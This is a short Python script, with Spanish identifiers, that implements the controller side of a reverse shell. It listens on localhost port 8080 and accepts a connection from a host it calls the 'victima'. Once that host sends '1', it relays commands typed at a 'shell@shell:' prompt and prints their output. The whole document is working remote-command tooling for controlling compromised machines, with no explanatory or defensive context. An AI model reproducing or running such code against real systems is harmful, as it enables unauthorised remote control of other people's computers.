import socket

server=socket.socket()
server.bind(('localhost',8080))
server.listen(1)

while True:
    victima, direction=server.accept()
    print ('conecction de: {} '.format(direction))
    msjBinario=victima.recv(1024)
    msjCodifi=msjBinario.decode('utf8')
    if msjCodifi=="1":
        while True:
            opcion=input("shell@shell: ")
            victima.send(opcion.encode("utf8"))
            resultado=victima.recv(2048)
            print (resultado)

    else:
        print("Error")
        break
